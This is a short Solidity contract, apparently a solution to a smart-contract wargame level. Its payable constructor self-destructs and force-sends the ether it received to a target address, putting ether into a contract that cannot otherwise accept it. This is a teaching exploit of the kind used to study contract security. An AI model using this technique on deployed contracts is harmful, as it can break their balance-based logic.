// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSolution {
  constructor(address targetAddress) payable {
    require(msg.value > 0, "must send value");
    selfdestruct(payable(targetAddress));
  }
}